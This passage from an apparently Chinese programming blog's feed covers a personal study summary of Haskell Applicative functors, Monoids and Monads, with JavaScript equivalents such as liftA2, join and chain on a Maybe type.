(+3)</code>相当于<code>(+)</code>和<code>(+3)</code>组合，而这两个组合的结果<code>(+) &lt;$&gt; (+3) :: Num a =&gt; a -&gt; a -&gt; a</code>，返回一个接受两个参数的函数，第一个参数用于(+3)，结果再和第二个参数一起调用(+)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ghci&gt; (\x y z -&gt; [x,y,z]) &lt;$&gt; (+3) &lt;*&gt; (*2) &lt;*&gt; (/2) $ 5  </span><br><span class="line">[8.0,10.0,2.5]</span><br></pre></td></tr></table></figure><h3 id="lift"><a href="#lift" class="headerlink" title="lift"></a>lift</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">liftA2</span> :: (<span class="type">Applicative</span> f) =&gt; (a -&gt; b -&gt; c) -&gt; f a -&gt; f b -&gt; f c  </span><br><span class="line"><span class="title">liftA2</span> f a b = f &lt;$&gt; a &lt;*&gt; b</span><br></pre></td></tr></table></figure><p>同理，在js中实现:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> liftA2 = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, functor1, functor2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> functor1.map(f).ap(functor2);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> liftA3 = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, functor1, functor2, functor3</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> functor1.map(f).ap(functor2).ap(functor3);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>或者看看ramda关于lift实现:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> madd3 = R.lift(<span class="function">(<span class="params">a, b, c</span>) =&gt;</span> a + b + c);</span><br><span class="line"></span><br><span class="line">madd3([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>]); <span class="comment">//=&gt; [3, 4, 5, 4, 5, 6, 5, 6, 7]</span></span><br></pre></td></tr></table></figure></p><p>这样程序写法上就更加通用，因为没有体现具体的functor:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">liftA2(add, Maybe.of(<span class="number">2</span>), Maybe.of(<span class="number">3</span>));</span><br><span class="line"><span class="comment">// Maybe(5)</span></span><br><span class="line"></span><br><span class="line">liftA2(renderPage, Http.get(<span class="string">'/destinations'</span>), Http.get(<span class="string">'/events'</span>))</span><br><span class="line"><span class="comment">// Task("&lt;div&gt;some page with dest and events&lt;/div&gt;")</span></span><br><span class="line"></span><br><span class="line">liftA3(signIn, getVal(<span class="string">'#email'</span>), getVal(<span class="string">'#password'</span>), IO.of(<span class="literal">false</span>));</span><br><span class="line"><span class="comment">// IO(&#123;id: 3, email: "gg@allin.com"&#125;)</span></span><br></pre></td></tr></table></figure></p><h3 id="与Functor-Monad转换"><a href="#与Functor-Monad转换" class="headerlink" title="与Functor,Monad转换"></a>与Functor,Monad转换</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Applicative实现fmap:</span></span><br><span class="line"><span class="title">fmap</span> (<span class="string">"hello "</span>++) (<span class="type">Just</span> <span class="string">"luoxia"</span>)</span><br><span class="line"><span class="title">pure</span> (<span class="string">"hello "</span>++) &lt;*&gt; <span class="type">Just</span> <span class="string">"luoxia"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Monad实现fmap:</span></span><br><span class="line"><span class="title">fmap</span> (<span class="string">"hello "</span>++) (<span class="type">Just</span> <span class="string">"luoxia"</span>)</span><br><span class="line"><span class="type">Just</span> <span class="string">"luoxia"</span> &gt;&gt;= (\name -&gt; <span class="type">Just</span> (<span class="string">"hello "</span> ++ name))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Monad实现 &lt;*&gt;:</span></span><br><span class="line"><span class="title">pure</span> (<span class="string">"hello "</span>++) &lt;*&gt; <span class="type">Just</span> <span class="string">"luoxia"</span></span><br><span class="line"><span class="title">pure</span> (<span class="string">"hello "</span>++) &gt;&gt;= (\f -&gt; fmap f (<span class="type">Just</span> <span class="string">"luoxia"</span>))</span><br></pre></td></tr></table></figure><p>js角度：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 of/ap 衍生出的 fmap</span></span><br><span class="line">X.prototype.fmap = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.constructor.of(f).ap(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从 chain 衍生出的 map</span></span><br><span class="line">X.prototype.fmap = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> m = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">return</span> m.chain(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> m.constructor.of(f(a));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 chain/map 衍生出的 ap</span></span><br><span class="line">X.prototype.ap = <span class="function"><span class="keyword">function</span>(<span class="params">other</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.chain(<span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> other.fmap(f);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="Monoids"><a href="#Monoids" class="headerlink" title="Monoids"></a>Monoids</h2><p>幺半群是一个存在单位元（幺元）的半群。满足结合律，有单位元。一个 monoid 是你有一个遵守结合律的二元函数还有一个可以相对于那个函数作为 identity 的值。</p><p>haskell中关于Monoids class的定义:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Monoid</span> a <span class="keyword">where</span></span></span><br><span class="line">  mempty :: a          <span class="comment">-- 表示一个特定 monoid 的 identity</span></span><br><span class="line">  mappend :: a -&gt; a -&gt; a    <span class="comment">-- 接受两个 monoid 的值并回传另外一个</span></span><br><span class="line">  mconcat :: [a] -&gt; a</span><br></pre></td></tr></table></figure></p><p>这样就可以得出monoid的laws:</p><ol><li>mempty <code>mappend</code> x = x</li><li>x <code>mappend</code> mempty = x</li><li>(x <code>mappend</code> y) <code>mappend</code> z = x <code>mappend</code> (y <code>mappend</code> z)</li></ol><h3 id="Monoids-instance"><a href="#Monoids-instance" class="headerlink" title="Monoids instance"></a>Monoids instance</h3><p>List :</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Monoid</span> [a] <span class="keyword">where</span></span></span><br><span class="line">        mempty  = []</span><br><span class="line">        mappend = (++)</span><br><span class="line">        mconcat xss = [x | xs &lt;- xss, x &lt;- xs]</span><br></pre></td></tr></table></figure><p>Product and Sum:</p><p>由于数值类型的数据可以有不同的monoid实现，如<code>*做二元函数，1作幺元</code>或者<code>+做二元函数,0作幺元</code>。</p><p>要通过两种方式实现，就如同用随机组合和链式两种方式实现List的<code>Applicative instance</code>定义一样，可以用<code>newtype</code>方式实现。这方面我的另外一篇关于<code>Haskell类型系统</code>的总结有说明。</p><p>以<code>Product</code>为例:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">newtype</span> <span class="type">Product</span> a =  <span class="type">Product</span> &#123; <span class="title">getProduct</span> :: <span class="title">a</span> &#125;  </span></span><br><span class="line">    <span class="keyword">deriving</span> (<span class="type">Eq</span>, <span class="type">Ord</span>, <span class="type">Read</span>, <span class="type">Show</span>, <span class="type">Bounded</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Num</span> a =&gt; <span class="type">Monoid</span> (<span class="type">Product</span> <span class="title">a</span>) <span class="keyword">where</span></span>  </span><br><span class="line">    mempty = <span class="type">Product</span> <span class="number">1</span>  </span><br><span class="line">    <span class="type">Product</span> x `mappend` <span class="type">Product</span> y = <span class="type">Product</span> (x * y)</span><br></pre></td></tr></table></figure></p><p>即<code>getProduct $ Product 3</code>mappend<code>Product 9</code>得　27.</p><p>Any and ALL用于定义Bool数据的两种不同monoid实现。</p><p>The Ordering monoid:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Monoid</span> <span class="type">Ordering</span> <span class="keyword">where</span></span></span><br><span class="line">        mempty         = <span class="type">EQ</span></span><br><span class="line">        <span class="type">LT</span> `mappend` _ = <span class="type">LT</span></span><br><span class="line">        <span class="type">EQ</span> `mappend` y = y</span><br><span class="line">        <span class="type">GT</span> `mappend` _ = <span class="type">GT</span></span><br></pre></td></tr></table></figure><p>这个可以运用到对于两个数据进行多种方式比较，但不同方式之间有先后顺序时，如:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">lengthCompare</span> :: <span class="type">String</span> -&gt; <span class="type">String</span> -&gt; <span class="type">Ordering</span>  </span><br><span class="line"><span class="title">lengthCompare</span> x y = (length x `compare` length y) `mappend`  </span><br><span class="line">                    (vowels x `compare` vowels y) `mappend`  </span><br><span class="line">                    (x `compare` y)  </span><br><span class="line">    <span class="keyword">where</span> vowels = length . filter (`elem` <span class="string">"aeiou"</span>)</span><br></pre></td></tr></table></figure></p><p>Maybe the monoid:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Monoid</span> a =&gt; <span class="type">Monoid</span> (<span class="type">Maybe</span> <span class="title">a</span>) <span class="keyword">where</span></span></span><br><span class="line">  mempty = <span class="type">Nothing</span></span><br><span class="line">  <span class="type">Nothing</span> `mappend` m = m</span><br><span class="line">  m `mappend` <span class="type">Nothing</span> = m</span><br><span class="line">  <span class="type">Just</span> m1 `mappend` <span class="type">Just</span> m2 = <span class="type">Just</span> (m1 `mappend` m2)</span><br></pre></td></tr></table></figure></p><h2 id="Monad-type-class"><a href="#Monad-type-class" class="headerlink" title="Monad type class"></a>Monad type class</h2><p>前面讲了Functor和Applicative Functor，接下来我们要讲讲Monad，这玩意儿着实不好理解。这里仅作为个人学习总结，不代表能够作为学习参考用。</p><p>之前的Functor是: <code>(a -&gt; b) -&gt; f a -&gt; f b</code>，而Applicative是:<code>f (a -&gt; b) -&gt; f a -&gt; f b</code>，然后Monad要求是：<code>(Monad m) =&gt; m a -&gt; (a -&gt; m b) -&gt; m b</code></p><p>先来看看typeclass定义:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Applicative</span> m =&gt; <span class="type">Monad</span> m <span class="keyword">where</span></span></span><br><span class="line">    (&gt;&gt;=)       :: m a -&gt; (a -&gt; m b) -&gt; m b</span><br><span class="line"></span><br><span class="line">    (&gt;&gt;)        :: m a -&gt; m b -&gt; m b</span><br><span class="line">    m &gt;&gt; k = m &gt;&gt;= \_ -&gt; k</span><br><span class="line"></span><br><span class="line">    return      :: a -&gt; m a</span><br><span class="line">    return      = pure</span><br><span class="line"></span><br><span class="line">    fail        :: <span class="type">String</span> -&gt; m a</span><br><span class="line">    fail s      = errorWithoutStackTrace s</span><br></pre></td></tr></table></figure></p><p>我们可以联想到fmap实现，它们的区别是，fmap的函数会返回普通值，而<code>&gt;&gt;=</code>的函数会返回经过Monad context包装的值，如果考虑到直接将函数通过fmap运用到monad,函数的返回值还会再在外面包装一层Monad context,这样就成了两层context:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; fmap (\s -&gt; Just (s++&quot;,haha&quot;)) (Just &quot;luoxia&quot;)</span><br><span class="line">Just (Just &quot;luoxia,haha&quot;)</span><br></pre></td></tr></table></figure></p><p>js例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  safeProp :: Key -&gt; &#123;Key: a&#125; -&gt; Maybe a</span></span><br><span class="line"><span class="keyword">var</span> safeProp = curry(<span class="function"><span class="keyword">function</span>(<span class="params">x, obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Maybe(obj[x]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//  safeHead :: [a] -&gt; Maybe a</span></span><br><span class="line"><span class="keyword">var</span> safeHead = safeProp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//  firstAddressStreet :: User -&gt; Maybe (Maybe (Maybe Street) )</span></span><br><span class="line"><span class="keyword">var</span> firstAddressStreet = compose(</span><br><span class="line">  map(map(safeProp(<span class="string">'street'</span>))), map(safeHead), safeProp(<span class="string">'addresses'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">firstAddressStreet(</span><br><span class="line">  &#123;<span class="attr">addresses</span>: [&#123;<span class="attr">street</span>: &#123;<span class="attr">name</span>: <span class="string">'Mulburry'</span>, <span class="attr">number</span>: <span class="number">8402</span>&#125;, <span class="attr">postcode</span>: <span class="string">"WC2N"</span> &#125;]&#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// Maybe(Maybe(Maybe(&#123;name: 'Mulburry', number: 8402&#125;)))</span></span><br></pre></td></tr></table></figure></p><p>可以看到，<code>firstAddressStreet</code>组合函数的最后一个map调用为:<code>map(map(safeProp(&#39;street&#39;)))</code>，因为经历过前两个函数调用，实际的结果为：<code>Maybe(Maybe({street: {name: &#39;Mulburry&#39;, number: 8402}, postcode: &quot;WC2N&quot; }))</code>，用得到的对象被包了两层context,对其使用map，就得剥开两层。</p><p>这就好比洋葱，一层一层剥开你的心，会悲伤，会流泪。</p><p>而<code>&gt;&gt;=</code>的作用就是替我们剥开那多的一层外衣：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Maybe.prototype.join = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.isNothing() ? Maybe.of(<span class="literal">null</span>) : <span class="keyword">this</span>.__value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  join :: Monad m =&gt; m (m a) -&gt; m a</span></span><br><span class="line"><span class="keyword">var</span> join = <span class="function"><span class="keyword">function</span>(<span class="params">mma</span>)</span>&#123; <span class="keyword">return</span> mma.join(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  firstAddressStreet :: User -&gt; Maybe Street</span></span><br><span class="line"><span class="keyword">var</span> firstAddressStreet = compose(</span><br><span class="line">  join, map(safeProp(<span class="string">'street'</span>)), join, map(safeHead), safeProp(<span class="string">'addresses'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">firstAddressStreet(</span><br><span class="line">  &#123;<span class="attr">addresses</span>: [&#123;<span class="attr">street</span>: &#123;<span class="attr">name</span>: <span class="string">'Mulburry'</span>, <span class="attr">number</span>: <span class="number">8402</span>&#125;, <span class="attr">postcode</span>: <span class="string">"WC2N"</span> &#125;]&#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// Maybe(&#123;name: 'Mulburry', number: 8402&#125;)</span></span><br></pre></td></tr></table></figure></p><p>显然这还不够，要是我们能够将剥开多余外衣的操作和map操作合并就好了，那样就是我们的<code>&gt;&gt;=</code>真正要实现的:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  chain :: Monad m =&gt; (a -&gt; m b) -&gt; m a -&gt; m b</span></span><br><span class="line"><span class="keyword">var</span> chain = curry(<span class="function"><span class="keyword">function</span>(<span class="params">f, m</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> m.map(f).join(); <span class="comment">// 或者 compose(join, map(f))(m)</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map/join</span></span><br><span class="line"><span class="keyword">var</span> firstAddressStreet = compose(</span><br><span class="line">  join, map(safeProp(<span class="string">'street'</span>)), join, map(safeHead), safeProp(<span class="string">'addresses'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// chain</span></span><br><span class="line"><span class="keyword">var</span> firstAddressStreet = compose(</span><br><span class="line">  chain(safeProp(<span class="string">'street'</span>)), chain(safeHead), safeProp(<span class="string">'addresses'</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>或者换一种写法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> result = Maybe.of(<span class="number">3</span>).chain(<span class="function"><span class="params">three</span> =&gt;</span> </span><br><span class="line">    Maybe.of(<span class="number">2</span>).fmap(_.add(three))</span><br><span class="line">).chain(<span class="function"><span class="params">sum</span> =&gt;</span> </span><br><span class="line">    Maybe.of(_.append(sum,[<span class="number">7</span>,<span class="number">6</span>]))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>咋这么眼熟呢？对，跟Promise贼像。这就是链式调用。</p><h3 id="Maybe-Monad"><a href="#Maybe-Monad" class="headerlink" title="Maybe Monad"></a>Maybe Monad</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span>  <span class="type">Monad</span> <span class="type">Maybe</span>  <span class="keyword">where</span></span></span><br><span class="line">    (<span class="type">Just</span> x) &gt;&gt;= k      = k x</span><br><span class="line">    <span class="type">Nothing</span>  &gt;&gt;= _      = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line">    (&gt;&gt;) = (*&gt;)</span><br><span class="line"></span><br><span class="line">    fail _              = <span class="type">Nothing</span></span><br></pre></td></tr></table></figure><p>例子:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">landLeft</span> :: <span class="type">Birds</span> -&gt; <span class="type">Pole</span> -&gt; <span class="type">Maybe</span> <span class="type">Pole</span>  </span><br><span class="line"><span class="title">landLeft</span> n (left,right)  </span><br><span class="line">    | abs ((left + n) - right) &lt; <span class="number">4</span> = <span class="type">Just</span> (left + n, right)  </span><br><span class="line">    | otherwise                    = <span class="type">Nothing</span>  </span><br><span class="line"></span><br><span class="line"><span class="title">landRight</span> :: <span class="type">Birds</span> -&gt; <span class="type">Pole</span> -&gt; <span class="type">Maybe</span> <span class="type">Pole</span>  </span><br><span class="line"><span class="title">landRight</span> n (left,right)  </span><br><span class="line">    | abs (left - (right + n)) &lt; <span class="number">4</span> = <span class="type">Just</span> (left, right + n)  </span><br><span class="line">    | otherwise                    = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">return</span> (<span class="number">0</span>,<span class="number">0</span>) &gt;&gt;= landLeft <span class="number">1</span> &gt;&gt; <span class="type">Nothing</span> &gt;&gt;= landRight <span class="number">1</span>  <span class="comment">--Nothing</span></span><br></pre></td></tr></table></figure></p><p>这里的<code>&gt;&gt;</code>对于Maybe是在<code>Applicative instance</code>定义的：<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Just</span> _m1 *&gt; m2      = m2</span><br><span class="line"><span class="type">Nothing</span>  *&gt; _m2     = <span class="type">Nothing</span></span><br></pre></td></tr></table></figure></p><p>换成<code>do</code>写法:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">routine</span> :: <span class="type">Maybe</span> <span class="type">Pole</span>  </span><br><span class="line"><span class="title">routine</span> = <span class="keyword">do</span>  </span><br><span class="line">    start &lt;- return (<span class="number">0</span>,<span class="number">0</span>)  </span><br><span class="line">    first &lt;- landLeft １ start  </span><br><span class="line">    <span class="type">Nothing</span>  </span><br><span class="line">    second &lt;- landRight １ first  </span><br><span class="line">    landLeft <span class="number">1</span> second</span><br></pre></td></tr></table></figure></p><h3 id="List-Monad"><a href="#List-Monad" class="headerlink" title="List Monad"></a>List Monad</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Monad</span> []  <span class="keyword">where</span></span></span><br><span class="line">    xs &gt;&gt;= f             = [y | x &lt;- xs, y &lt;- f x]</span><br><span class="line">    (&gt;&gt;) = (*&gt;)</span><br><span class="line">    fail _              = []</span><br></pre></td></tr></table></figure><p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ghci&gt; [1,2] &gt;&gt;= \n -&gt; [&apos;a&apos;,&apos;b&apos;] &gt;&gt;= \ch -&gt; return (n,ch)  </span><br><span class="line">[(1,&apos;a&apos;),(1,&apos;b&apos;),(2,&apos;a&apos;),(2,&apos;b&apos;)]</span><br></pre></td></tr></table></figure></p><p>换种写法:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">listOfTuples</span> :: [(<span class="type">Int</span>,<span class="type">Char</span>)]  </span><br><span class="line"><span class="title">listOfTuples</span> = <span class="keyword">do</span>  </span><br><span class="line">    n &lt;- [<span class="number">1</span>,<span class="number">2</span>]  </span><br><span class="line">    ch &lt;- ['a','b']  </span><br><span class="line">    return (n,ch)</span><br></pre></td></tr></table></figure></p><p><img src="https://learnyoua.haskell.sg/content/zh-cn/ch12/concatmap.png" alt="https://learnyoua.haskell.sg/content/zh-cn/ch12/concatmap.png"></p><p>实际上<code>[ (n,ch) | n &lt;- [1,2], ch &lt;- [&#39;a&#39;,&#39;b&#39;] ]</code>就是上面写法的一种语法糖。</p><p>再来个例子:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">guard</span> :: (<span class="type">MonadPlus</span> m) =&gt; <span class="type">Bool</span> -&gt; m ()  </span><br><span class="line"><span class="title">guard</span> <span class="type">True</span> = return ()  </span><br><span class="line"><span class="title">guard</span> <span class="type">False</span> = mzero</span><br><span class="line"></span><br><span class="line">[<span class="number">1.</span><span class="number">.50</span>] &gt;&gt;= (\x -&gt; guard ('<span class="number">7</span>' `elem` show x) &gt;&gt; return x) 　<span class="comment">--[7,17,27,37,47]</span></span><br></pre></td></tr></table></figure></p><p>这里引用<code>Control.Monad</code>中的<code>guard</code>函数，传递一个Bool参数，回传一个<code>MonadPlus instance</code>包装的数据，这里List在<code>guard True</code>下返回<code>[()]</code>，否则返回<code>[]</code>。</p><p>而对于List的<code>&gt;&gt;</code>在<code>Applicative instance</code>定义:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">xs</span> *&gt; ys  = [y | _ &lt;- xs, y &lt;- ys]</span><br></pre></td></tr></table></figure><p>当<code>[()] &gt;&gt; return x</code>的时候，返回<code>[x]</code>，当<code>[] &gt;&gt; return x</code>的时候，返回<code>[]</code>，这个不难理解。这样就起到了filter的作用。</p><p>也可以换成下面这种写法:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sevensOnly</span> :: [<span class="type">Int</span>]  </span><br><span class="line"><span class="title">sevensOnly</span> = <span class="keyword">do</span>  </span><br><span class="line">    x &lt;- [<span class="number">1.</span><span class="number">.50</span>]  </span><br><span class="line">    guard ('<span class="number">7</span>' `elem` show x)  </span><br><span class="line">    return x</span><br></pre></td></tr></table></figure></p><p>可见guard这句不进行<code>&lt;-</code>，就相当于在其后用<code>&gt;&gt;</code></p><p><strong>未完待续…</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从Functors到Monad，理解Functor,Applicative,Monoids,Monad。文章理解或有偏差，仅作为自己总结用。&lt;/p&gt;
    
    </summary>
    
      <category term="Haskell" scheme="http://luoxia.me/code/categories/Haskell/"/>
    
    
      <category term="Haskell" scheme="http://luoxia.me/code/tags/Haskell/"/>
    
      <category term="functional" scheme="http://luoxia.me/code/tags/functional/"/>
    
      <category term="Monad" scheme="http://luoxia.me/code/tags/Monad/"/>
    
      <category term="Functor" scheme="http://luoxia.me/code/tags/Functor/"/>
    
      <category term="Applicative" scheme="http://luoxia.me/code/tags/Applicative/"/>
    
      <category term="Monoid" scheme="http://luoxia.me/code/tags/Monoid/"/>
    
  </entry>
  
  <entry>
    <title>libuv网络I/O机制</title>
    <link href="http://luoxia.me/code/2017/07/27/libuv%E7%BD%91%E7%BB%9CIO%E6%9C%BA%E5%88%B6/"/>
    <id>http://luoxia.me/code/2017/07/27/libuv网络IO机制/</id>
    <published>2017-07-27T06:18:17.000Z</published>
    <updated>2017-11-16T13:10:06.488Z</updated>
    
